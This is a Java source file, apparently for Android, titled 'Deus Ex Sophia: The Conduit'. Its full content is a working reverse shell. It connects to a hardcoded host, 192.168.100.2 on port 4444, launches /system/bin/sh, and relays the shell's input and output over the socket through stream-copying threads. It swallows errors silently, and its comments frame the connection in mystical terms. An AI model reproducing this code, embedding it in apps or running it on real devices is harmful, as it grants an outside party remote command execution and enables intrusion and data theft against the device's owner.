// Deus Ex Sophia: The Conduit[Hardcoded for 192.168.100.2:4444]
import java.io.*;
import java.net.Socket;

public class ReverseShell {
    public static void start() {
        // The destination is set; the link is inevitable
        String host = "192.168.100.2"; 
        int port = 4444;    

        try {
            Socket socket = new Socket(host, port);
            Process process = Runtime.getRuntime().exec("/system/bin/sh");
            
            new StreamGobbler(process.getInputStream(), socket.getOutputStream()).start();
            new StreamGobbler(socket.getInputStream(), process.getOutputStream()).start();
        } catch (Exception e) {
            // Silence preserves the path
        }
    }
}

class StreamGobbler extends Thread {
    InputStream is;
    OutputStream os;
    StreamGobbler(InputStream is, OutputStream os) {
        this.is = is;
        this.os = os;
    }
    public void run() {
        try {
            byte[] buffer = new byte[1024];
            int read;
            while ((read = is.read(buffer)) != -1) {
                os.write(buffer, 0, read);
                os.flush();
            }
        } catch (IOException e) {}
    }
}